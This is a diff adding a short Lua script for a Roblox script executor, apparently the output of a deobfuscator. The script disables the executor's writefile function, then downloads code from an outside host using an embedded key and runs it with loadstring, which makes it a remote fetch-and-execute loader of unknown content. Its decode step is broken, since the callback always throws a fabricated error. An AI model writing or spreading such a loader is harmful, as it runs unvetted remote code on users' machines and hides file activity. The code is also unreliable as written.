@@ -1,0 +1,26 @@
+-- ts file was generated at discord.gg/25ms
+
+local genv = getgenv()
+local _ = genv.writefile
+
+genv.writefile = function() end
+
+game:IsLoaded()
+setfpscap(1000000)
+task.spawn(function()
+    local _call11 = game:HttpGet('https://alien-hub.vercel.app/api/get?script=Log&key=bN5vX9wP2rL1mK7sQ8dJ4gH0fA3eS6tY9uC2iO1zR8pQ5nW7xM4zV9kL0jH2nG7d&t=81e4952242bfb32c')
+    local _ = #_call11
+    local _ = #_call11
+    local _call15 = _call11:gsub('..', function(_16)
+        error("line 30: invalid argument #1 to 'tonumber' (string expected, got table)")
+    end)
+
+    task.spawn(function(...)
+        local _21 = loadstring(_call15)(...)
+
+        return _21
+    end)
+end)
+tostring(game.PlaceId)
+
+local _ = game.PlaceId
